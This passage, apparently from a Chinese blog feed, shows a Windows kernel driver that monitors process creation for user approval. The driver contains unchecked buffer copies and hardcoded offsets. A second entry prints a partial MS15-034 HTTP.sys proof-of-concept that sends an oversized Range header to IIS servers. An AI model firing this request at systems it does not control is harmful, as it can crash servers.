class="line"><span class="class"></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">	ULONGPID;</div><div class="line"></div><div class="line">	charname[<span class="number">16</span>];</div><div class="line"></div><div class="line">	charPATH[<span class="number">256</span>];</div><div class="line">&#125;PROCERSSINFO, *PPROCESSINFO;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">HANDLEINFO</span></span></div><div class="line"><span class="class"></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">	HANDLEarg1;     <span class="comment">/* 这个是 内核层 SET */</span></div><div class="line"></div><div class="line">	HANDLEarg2;     <span class="comment">/* 这个是 应用层 SET */</span></div><div class="line">&#125;HANDLEINFO, *PHANDLEINFO;</div><div class="line"></div><div class="line"></div><div class="line">__declspec( dllimport )</div><div class="line"></div><div class="line"></div><div class="line">NTSTATUS NTAPI</div><div class="line"></div><div class="line">ZwTerminateProcess( IN HANDLE ProcessHandle OPTIONAL,</div><div class="line"></div><div class="line">		    IN NTSTATUS ExitStatus );</div><div class="line"></div><div class="line"></div><div class="line">NTSTATUS</div><div class="line"></div><div class="line">PsLookupProcessByProcessId(</div><div class="line"></div><div class="line">	IN HANDLE ProcessId,</div><div class="line"></div><div class="line">	OUT PEPROCESS *Process</div><div class="line"></div><div class="line">	);</div></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"></div><div class="line">.sys</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"zhudongfangyu.h"</span></span></div><div class="line"></div><div class="line">BOOLEAN g_bIsNotifyRoutineSetted;</div><div class="line"></div><div class="line">PKEVENT g_pEventObject0 = <span class="literal">NULL</span>;         <span class="comment">/* 内核层触发 */</span></div><div class="line"></div><div class="line">PKEVENT g_pEventObject3 = <span class="literal">NULL</span>;         <span class="comment">/* 应用层触发 */</span></div><div class="line"></div><div class="line">HANDLEg_hEvent = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line"></div><div class="line">BOOLEANg_bREPLY;</div><div class="line"></div><div class="line">UNICODE_STRINGEventName;</div><div class="line"></div><div class="line"></div><div class="line">OBJECT_HANDLE_INFORMATION g_ObjectHandleInfo;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">VOID <span class="title">PrintIrpInfo</span><span class="params">( PIRP Irp )</span></span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">VOID <span class="title">MyUnload</span><span class="params">( PDRIVER_OBJECT pDerverObject )</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	PDEVICE_OBJECTdevObj = pDerverObject-&gt;DeviceObject;</div><div class="line"></div><div class="line">	UNICODE_STRINGsymbolicName;</div><div class="line"></div><div class="line">	RtlInitUnicodeString( &amp;symbolicName, SYMBOLICNAME );</div><div class="line"></div><div class="line">	IoDeleteSymbolicLink( &amp;symbolicName );</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( devObj != <span class="literal">NULL</span> )</div><div class="line"></div><div class="line">	&#123;</div><div class="line">		IoDeleteDevice( devObj );</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	DbgPrint( <span class="string">"MyUnload"</span> );</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">NTSTATUS <span class="title">SioctlCreateClose</span><span class="params">( PDEVICE_OBJECT DeviceObject, PIRP irp )</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	irp-&gt;IoStatus.Status = STATUS_SUCCESS;</div><div class="line"></div><div class="line">	irp-&gt;IoStatus.Information = <span class="number">0</span>;</div><div class="line"></div><div class="line">	IoCompleteRequest( irp, IO_NO_INCREMENT );</div><div class="line"></div><div class="line">	<span class="keyword">return</span>(STATUS_SUCCESS);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * PID信息</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * CHAR g_szPIDInfo[20];</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> */</span></div><div class="line"></div><div class="line"></div><div class="line">PROCERSSINFO pi;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">VOID <span class="title">CreateProcessNotifyFunction</span><span class="params">( IN HANDLE hParentId, IN HANDLE hProcessId, IN BOOLEAN bCreate )</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	PEPROCESSlProcess;</div><div class="line"></div><div class="line">	ANSI_STRINGExePath;</div><div class="line"></div><div class="line"><span class="comment">/*POBJECT_NAME_INFORMATION ExePath;*/</span></div><div class="line"></div><div class="line"><span class="comment">/* 如果是进程创建 */</span></div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( bCreate )</div><div class="line"></div><div class="line">	&#123;</div><div class="line">		PsLookupProcessByProcessId( hProcessId, &amp;lProcess );</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * 格式化字符串</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * RtlZeroMemory(g_szPIDInfo, 20);</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * RtlStringCchPrintfA(g_szPIDInfo, 20, "%d", (int)hProcessId);</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> */</span></div><div class="line"></div><div class="line"></div><div class="line">		GetProcPath( hProcessId, &amp;ExePath );</div><div class="line"></div><div class="line">		RtlCopyBytes( (PVOID) pi.name, (PVOID) ( (<span class="keyword">char</span> *) lProcess + <span class="number">0x16c</span>), <span class="number">15</span> );</div><div class="line"></div><div class="line">		RtlCopyBytes( pi.PATH, ExePath.Buffer, ExePath.Length );</div><div class="line"></div><div class="line">		pi.PID = hProcessId;</div><div class="line"></div><div class="line"></div><div class="line">		DbgPrint( <span class="string">" %s"</span>, pi.name );</div><div class="line"></div><div class="line">		DbgPrint( <span class="string">"%s"</span>, pi.PATH );</div><div class="line"></div><div class="line">		DbgPrint( <span class="string">"%x"</span>, pi.PID );</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*RtlStringCchPrintfA( pi.PATH, ExePath-&gt;Length, "%s" , ExePath-&gt;Buffer ); */</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* 设置事件为有信号，通知应用层  接收 数据 */</span></div><div class="line"></div><div class="line">		KeSetEvent( g_pEventObject0, <span class="number">0</span>, FALSE );</div><div class="line"></div><div class="line"><span class="comment">/* 等待应用层确认。。 */</span></div><div class="line"></div><div class="line">		KeClearEvent( g_pEventObject3 );</div><div class="line"></div><div class="line">		DbgPrint( <span class="string">"-- Ring3 应该 反馈 --"</span> );</div><div class="line"></div><div class="line"></div><div class="line">		KeWaitForSingleObject( g_pEventObject3, Executive, KernelMode, FALSE, <span class="literal">NULL</span> );</div><div class="line"></div><div class="line"></div><div class="line">		DbgPrint( <span class="string">"-- RIng3 来了反馈--"</span> );</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ( g_bREPLY != TRUE )</div><div class="line"></div><div class="line">		&#123;</div><div class="line">			DbgPrint( <span class="string">"-- Ring3 决定结束进程 --"</span> );</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * .... 其他操作</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> */</span></div><div class="line">		&#125;</div><div class="line"></div><div class="line">		DbgPrint( <span class="string">"-- Ring3 决定 放行 --"</span> );</div><div class="line"></div><div class="line">		KeClearEvent( g_pEventObject3 );</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">NTSTATUS <span class="title">SioctlDeviceControl</span><span class="params">( PDEVICE_OBJECT DeviceObject, PIRP irp )</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	PIO_STACK_LOCATIONirpSp;</div><div class="line"></div><div class="line">	ULONGinputBuffLength;</div><div class="line"></div><div class="line">	NTSTATUSstatus = STATUS_SUCCESS;</div><div class="line"></div><div class="line">	PCHARinBuf, outBuf;</div><div class="line"></div><div class="line">	PCHARbuffer = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">	ULONGOutputBuffLength;</div><div class="line"></div><div class="line">	HANDLEINFOhi;</div><div class="line"></div><div class="line">	irpSp = IoGetCurrentIrpStackLocation( irp );</div><div class="line"></div><div class="line">	inputBuffLength = irpSp-&gt;Parameters.DeviceIoControl.InputBufferLength;</div><div class="line"></div><div class="line">	OutputBuffLength = irpSp-&gt;Parameters.DeviceIoControl.OutputBufferLength;</div><div class="line"></div><div class="line"></div><div class="line">	inBuf = (PCHAR) irp-&gt;AssociatedIrp.SystemBuffer;</div><div class="line"></div><div class="line">	outBuf = (PCHAR) irp-&gt;AssociatedIrp.SystemBuffer;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> *      DbgPrint("-- SioctlDeviceControl --");</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> *      PrintIrpInfo(irp);</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> */</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> *      DbgPrint("-- 1 --");</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> *      DbgPrint("IOCTL_START : %x ",IOCTL_START);</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> */</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * if(!inputBuffLength || ! OutputBuffLength)</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * &#123;</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * status = STATUS_INVALID_PARAMETER;</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * goto END;</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * &#125;*/</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> *      DbgPrint("-- 2 --");</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> *      DbgPrint("IOCTL_START : %x ",IOCTL_START);</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> */</span></div><div class="line"></div><div class="line"></div><div class="line">	<span class="keyword">switch</span> ( irpSp-&gt;Parameters.DeviceIoControl.IoControlCode )</div><div class="line"></div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> IOCTL_START:</div><div class="line"></div><div class="line">	&#123;</div><div class="line">		DbgPrint( <span class="string">" -- START --"</span> );</div><div class="line"></div><div class="line"><span class="comment">/* 取得句柄对象 */</span></div><div class="line"></div><div class="line">		hi = *(PHANDLEINFO ) inBuf;</div><div class="line"></div><div class="line">		status = ObReferenceObjectByHandle( hi.arg1, \</div><div class="line"></div><div class="line">						    GENERIC_ALL, <span class="literal">NULL</span>, KernelMode, (PVOID *) &amp;g_pEventObject0, &amp;g_ObjectHandleInfo );</div><div class="line"></div><div class="line"></div><div class="line">		status = ObReferenceObjectByHandle( hi.arg2, \</div><div class="line"></div><div class="line">						    GENERIC_ALL, <span class="literal">NULL</span>, KernelMode, (PVOID *) &amp;g_pEventObject3, &amp;g_ObjectHandleInfo );</div><div class="line"></div><div class="line"></div><div class="line">		KdPrint( (<span class="string">"g_pEventObject0 = 0x%X , g_pEventObject3 = 0x%X\n"</span>, g_pEventObject0, g_pEventObject3) );</div><div class="line"></div><div class="line"></div><div class="line">		<span class="keyword">if</span> ( !g_bIsNotifyRoutineSetted )</div><div class="line"></div><div class="line">		&#123;</div><div class="line">			PsSetCreateProcessNotifyRoutine( CreateProcessNotifyFunction, FALSE );</div><div class="line"></div><div class="line">			g_bIsNotifyRoutineSetted = TRUE;</div><div class="line">		&#125;</div><div class="line"></div><div class="line"></div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">	<span class="keyword">case</span> IOCTL_STOP:</div><div class="line"></div><div class="line">	&#123;</div><div class="line">		DbgPrint( <span class="string">" -- STOP --"</span> );</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ( g_bIsNotifyRoutineSetted )</div><div class="line"></div><div class="line">		&#123;</div><div class="line"><span class="comment">/* 移除进程创建通知函数 */</span></div><div class="line"></div><div class="line">			PsSetCreateProcessNotifyRoutine( CreateProcessNotifyFunction, TRUE );</div><div class="line"></div><div class="line">			g_bIsNotifyRoutineSetted = FALSE;</div><div class="line">		&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* 释放对象引用 */</span></div><div class="line"></div><div class="line">		<span class="keyword">if</span> ( g_pEventObject0 != <span class="literal">NULL</span> )</div><div class="line"></div><div class="line">		&#123;</div><div class="line">			ObDereferenceObject( g_pEventObject0 );</div><div class="line"></div><div class="line">			g_pEventObject0 = <span class="literal">NULL</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line"></div><div class="line">		<span class="keyword">if</span> ( g_pEventObject3 != <span class="literal">NULL</span> )</div><div class="line"></div><div class="line">		&#123;</div><div class="line">			ObDereferenceObject( g_pEventObject3 );</div><div class="line"></div><div class="line">			g_pEventObject3 = <span class="literal">NULL</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line"></div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">	<span class="keyword">case</span> IOCTL_GET_DATA:</div><div class="line"></div><div class="line">	&#123;</div><div class="line">		ULONG nLength = <span class="keyword">sizeof</span>(pi);</div><div class="line"></div><div class="line">		DbgPrint( <span class="string">" -- GET_DATA --"</span> );</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ( outBuf == <span class="literal">NULL</span> &amp;&amp; (OutputBuffLength &lt; nLength) )</div><div class="line"></div><div class="line">		&#123;</div><div class="line">			KdPrint( (<span class="string">"OutputBufferSize is too small ~!\n"</span>) );</div><div class="line"></div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*复制进程PID到输出缓冲区 */</span></div><div class="line"></div><div class="line">		RtlCopyBytes( (PCHAR) outBuf, (PVOID) &amp;pi, nLength );</div><div class="line"></div><div class="line">		OutputBuffLength = nLength;</div><div class="line"></div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">	<span class="keyword">case</span> IOCTL_SET_REPLY:</div><div class="line"></div><div class="line">	&#123;</div><div class="line">		RtlCopyBytes( (PVOID) &amp;g_bREPLY, inBuf, inputBuffLength ); <span class="comment">/* 1 字节 */</span></div><div class="line"></div><div class="line">		DbgPrint( <span class="string">"IOCTL_SET_REPLY: %d "</span>, g_bREPLY );</div><div class="line"></div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">END:</div><div class="line"></div><div class="line">	irp-&gt;IoStatus.Status = STATUS_SUCCESS;</div><div class="line"></div><div class="line"></div><div class="line">	irp-&gt;IoStatus.Information = OutputBuffLength;</div><div class="line"></div><div class="line">	IoCompleteRequest( irp, IO_NO_INCREMENT );</div><div class="line"></div><div class="line"></div><div class="line">	<span class="keyword">return</span>(STATUS_SUCCESS);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">( PDRIVER_OBJECT pDriverObject, PUNICODE_STRING RegPath )</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	NTSTATUS status;</div><div class="line"></div><div class="line"></div><div class="line">	UNICODE_STRING DriverName;</div><div class="line"></div><div class="line"></div><div class="line">	UNICODE_STRING symbolicName;</div><div class="line"></div><div class="line"></div><div class="line">	PDEVICE_OBJECT deviceObject;</div><div class="line"></div><div class="line"></div><div class="line">	RtlInitUnicodeString( &amp;DriverName, DRIVERNAME );</div><div class="line"></div><div class="line"></div><div class="line">	RtlInitUnicodeString( &amp;symbolicName, SYMBOLICNAME );</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/*  */</span></div><div class="line"></div><div class="line"></div><div class="line">	DbgPrint( <span class="string">"DriverEntry"</span> );</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* RtlInitUnicodeString(&amp;EventName, G_EVENT); */</span></div><div class="line"></div><div class="line">	status = IoCreateDevice(</div><div class="line"></div><div class="line">		pDriverObject,          <span class="comment">/* Our Driver Object */</span></div><div class="line"></div><div class="line">		<span class="number">0</span>,                      <span class="comment">/* We don't use a device extension */</span></div><div class="line"></div><div class="line">		&amp;DriverName,            <span class="comment">/* Device name "\Device\SIOCTL" */</span></div><div class="line"></div><div class="line">		FILE_DEVICE_UNKNOWN,    <span class="comment">/* Device type */</span></div><div class="line"></div><div class="line">		<span class="number">0</span>,                      <span class="comment">/* Device characteristics */</span></div><div class="line"></div><div class="line">		TRUE,                   <span class="comment">/* Not an exclusive device */</span></div><div class="line"></div><div class="line">		&amp;deviceObject );        <span class="comment">/* Returned ptr to Device Object */</span></div><div class="line"></div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( !NT_SUCCESS( status ) )</div><div class="line"></div><div class="line"></div><div class="line">	&#123;</div><div class="line">		DbgPrint( (<span class="string">"Couldn't create the device object %x \n"</span>), status );</div><div class="line"></div><div class="line"></div><div class="line">		<span class="keyword">return</span>(status);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	g_bIsNotifyRoutineSetted = FALSE;</div><div class="line"></div><div class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = SioctlCreateClose;</div><div class="line"></div><div class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = SioctlCreateClose;</div><div class="line"></div><div class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = SioctlDeviceControl;</div><div class="line"></div><div class="line">	pDriverObject-&gt;DriverUnload = MyUnload;</div><div class="line"></div><div class="line">	status = IoCreateSymbolicLink( &amp;symbolicName, &amp;DriverName );</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( !NT_SUCCESS( status ) )</div><div class="line"></div><div class="line">	&#123;</div><div class="line">		DbgPrint( (<span class="string">"Couldn't create the symboliclink \n"</span>) );</div><div class="line"></div><div class="line">		IoDeleteDevice( deviceObject );</div><div class="line"></div><div class="line">		<span class="keyword">return</span>(status);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span>(STATUS_SUCCESS);</div><div class="line">&#125;</div><div class="line"></div><div class="line">VOID</div><div class="line">PrintIrpInfo(</div><div class="line">	PIRP Irp )</div><div class="line">&#123;</div><div class="line">	PIO_STACK_LOCATION irpSp;</div><div class="line">	irpSp = IoGetCurrentIrpStackLocation( Irp );</div><div class="line">	PAGED_CODE();</div><div class="line">	DbgPrint( <span class="string">"\tIrp-&gt;AssociatedIrp.SystemBuffer = 0x%p\n"</span>,Irp-&gt;AssociatedIrp.SystemBuffer );</div><div class="line"></div><div class="line"></div><div class="line">	DbgPrint( <span class="string">"\tIrp-&gt;UserBuffer = 0x%p\n"</span>, Irp-&gt;UserBuffer );</div><div class="line"></div><div class="line"></div><div class="line">	DbgPrint( <span class="string">"\tirpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer = 0x%p\n"</span>,irpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer );</div><div class="line"></div><div class="line"></div><div class="line">	DbgPrint( <span class="string">"\tirpSp-&gt;Parameters.DeviceIoControl.InputBufferLength = %d\n"</span>,irpSp-&gt;Parameters.DeviceIoControl.InputBufferLength );</div><div class="line"></div><div class="line"></div><div class="line">	DbgPrint( <span class="string">"\tirpSp-&gt;Parameters.DeviceIoControl.OutputBufferLength = %d\n"</span>,irpSp-&gt;Parameters.DeviceIoControl.OutputBufferLength );</div><div class="line"></div><div class="line"></div><div class="line">	DbgPrint( <span class="string">"\t irpSp-&gt;Parameters.DeviceIoControl.IoControlCode  = %x\n"</span>,</div><div class="line"> irpSp-&gt;Parameters.DeviceIoControl.IoControlCode );</div><div class="line"></div><div class="line"></div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>APP<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">.h</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESSINFO</span></span></div><div class="line"><span class="class"></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">	ULONGPID;</div><div class="line"></div><div class="line">	charname[<span class="number">16</span>];</div><div class="line"></div><div class="line">	charPATH[<span class="number">256</span>];</div><div class="line">&#125;PROCERSSINFO, *PPROCESSINFO;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">HANDLEINFO</span></span></div><div class="line"><span class="class"></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">	HANDLEarg1;     <span class="comment">/* 这个是 内核层 SET */</span></div><div class="line"></div><div class="line">	HANDLEarg2;     <span class="comment">/* 这个是 应用层 SET */</span></div><div class="line">&#125;HANDLEINFO, *PHANDLEINFO;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* 全局事件 */</span></div><div class="line"></div><div class="line">HANDLE g_EventHandle;</div><div class="line"></div><div class="line">HANDLE g_hkEvent; <span class="comment">/* 内核层句柄 */</span></div><div class="line"></div><div class="line"><span class="keyword">bool</span> g_bIsRunnig;</div></pre></td></tr></table></figure></p>
<p>start函数<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">DWORD dwRet;</div><div class="line"></div><div class="line">HANDLEINFO hi ;</div><div class="line"></div><div class="line">hi.arg1 = g_EventHandle;</div><div class="line"></div><div class="line">hi.arg2 = g_hkEvent;</div><div class="line"></div><div class="line"><span class="keyword">bool</span> bRet = IOControl(IOCTL_START,&amp;hi ,<span class="keyword">sizeof</span>(HANDLEINFO) ,<span class="literal">NULL</span> , <span class="number">1024</span> ,&amp;dwRet);</div><div class="line"></div><div class="line"><span class="comment">//创建监听线程</span></div><div class="line"></div><div class="line">HANDLE  hThread = CreateThread(<span class="literal">NULL</span> , <span class="number">0</span> , (LPTHREAD_START_ROUTINE)&amp;WorkThread ,<span class="literal">NULL</span> ,<span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">g_bIsRunnig = <span class="literal">true</span>;</div><div class="line"></div><div class="line">CloseHandle(hThread);</div><div class="line"></div><div class="line">Sleep(<span class="number">1</span>);</div></pre></td></tr></table></figure></p>
<p>IOControl  函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IOControl</span><span class="params">( <span class="keyword">int</span> Ctl_code, LPVOID InputBuffer, <span class="keyword">int</span> InputLen, LPVOID OutputBuffer, <span class="keyword">int</span> OutputLen, LPDWORD dwRet )</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">bool</span> bRet = <span class="literal">false</span>;</div><div class="line"></div><div class="line">	HANDLE hDevice = CreateFile(<span class="string">"\\\\.\\KernelHandle"</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>,<span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span> );</div><div class="line"></div><div class="line"><span class="keyword">if</span> ( hDevice == INVALID_HANDLE_VALUE )</div><div class="line">&#123;</div><div class="line">		MessageBox( <span class="number">0</span>, <span class="string">"Failed To Open Device!"</span>, <span class="literal">NULL</span>, <span class="number">0</span> );</div><div class="line">				<span class="keyword">return</span>(<span class="literal">false</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">bRet = DeviceIoControl( hDevice, Ctl_code, InputBuffer, InputLen, OutputBuffer, OutputLen, dwRet, <span class="literal">NULL</span> );</div><div class="line">CloseHandle( hDevice );</div><div class="line"><span class="keyword">return</span>(bRet);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>线程函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function">DWORD WINAPI <span class="title">WorkThread</span><span class="params">( LPVOID lParam )</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	DWORD dRet;</div><div class="line"></div><div class="line">	InitializeCriticalSection( &amp;g_cs );</div><div class="line"></div><div class="line">	<span class="keyword">while</span> ( g_bIsRunnig )</div><div class="line"></div><div class="line">	&#123;</div><div class="line"><span class="comment">/* 等待同步时间 */</span></div><div class="line"></div><div class="line">		WaitForSingleObject( g_EventHandle, INFINITE ); <span class="comment">/* 等待 驱动程序 发出 信号 */</span></div><div class="line"></div><div class="line">		<span class="keyword">char</span> szBuffer[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line"></div><div class="line">		WCHAR szMsgBuffer[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line"></div><div class="line">		DWORD dwRet, nProcessId = <span class="number">0</span>;</div><div class="line"></div><div class="line">		EnterCriticalSection( &amp;g_cs );</div><div class="line"></div><div class="line">		<span class="comment">/* 接收到信号后 发出获取 本次信息 */</span></div><div class="line"></div><div class="line">		IOControl( IOCTL_GET_DATA, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;pi, <span class="keyword">sizeof</span>(pi), &amp;dwRet );</div><div class="line"></div><div class="line"></div><div class="line">		CString cs;</div><div class="line"></div><div class="line">		MsgDialog dlg;</div><div class="line"></div><div class="line">		UCHARdata = <span class="number">0</span>;</div><div class="line"></div><div class="line">		cs.Format( <span class="string">"%d "</span>, pi.PID );</div><div class="line"></div><div class="line">		dlg.m_id = cs;</div><div class="line"></div><div class="line">		cs.Format( <span class="string">"%s "</span>, pi.PATH );</div><div class="line"></div><div class="line">		dlg.m_path = cs;</div><div class="line"></div><div class="line">		cs.Format( <span class="string">"%s "</span>, pi.name );</div><div class="line"></div><div class="line">		dlg.m_name = cs;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ( IDOK == dlg.DoModal() ) <span class="comment">/* 这个是一个对话框类 */</span></div><div class="line"></div><div class="line">		&#123;</div><div class="line">			<span class="comment">/* 允许 */</span></div><div class="line"></div><div class="line">			data = <span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="comment">/* MessageBox ( 0, "允许" , "提示" ,MB_OK); */</span></div><div class="line">		&#125;</div><div class="line"></div><div class="line">		IOControl( IOCTL_SET_REPLY, &amp;data, <span class="number">1</span>, szBuffer, <span class="number">20</span>, &amp;dwRet );   <span class="comment">/* 设置好 用户 选择 */</span></div><div class="line"></div><div class="line"></div><div class="line">		LeaveCriticalSection( &amp;g_cs );</div><div class="line"></div><div class="line">		SetEvent( g_hkEvent );                                          <span class="comment">/* 通知内核 */</span></div><div class="line"></div><div class="line"></div><div class="line">		<span class="comment">/* 设置同步事件为无信号，等待下一次通知 */</span></div><div class="line"></div><div class="line">		ResetEvent( g_EventHandle );</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	DeleteCriticalSection( &amp;g_cs );</div><div class="line"></div><div class="line"></div><div class="line">	<span class="keyword">return</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[MS15-034 HTTP.sys 远程执行代码]]></title>
      <url>/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/</url>
      <content type="html"><![CDATA[<p><strong>现在最多造成蓝屏</strong></p>
<p><strong>POC</strong></p>
<blockquote>
<p>import socket</p>
<p>import random</p>
<p>ipAddr =&quot;WebSite&quot;</p>
<p>hexAllFfff =&quot;18446744073709551615&quot;</p>
<p>count=0</p>
<p>req1 =&quot;GET/ HTTP/1.0\r\n\r\n&quot;</p>
<p>req =&quot;GET/ HTTP/1.1\r\nHost: stuff\r\nRange: bytes=&quot;+str(count)+&quot;-&quot;+ hexAllFfff +&quot;\r\n\r\n&quot;</p>
<p>print &quot;[*] Audit Started&quot;</p>
<p>client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
<p>client_socket.connect((ipAddr, 80))</p>
<p>client_socket.send(req1)</p>
<p>boringResp = client_socket.recv(1024)</p>
<p>if &quot;Microsoft&quot; not in boringResp:</p>
<p>print &quot;[*] Not IIS&quot;</p>
<p>exit(0)</p>
<p>client_socket.close()</p>
<p>client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
<p>client_socket.connect((ipAddr, 80))</p>
<p>client_socket.send(req)</p>
<p>goodResp = client_socket.recv(1024)</p>
<p>if &quot;Requested Range Not Satisfiable&quot; in goodResp:</p>
<p>print &quot;[!!] Looks VULN&quot;</p>
<p>elif &quot; The request has an invalid header name&quot; in goodResp:</p>
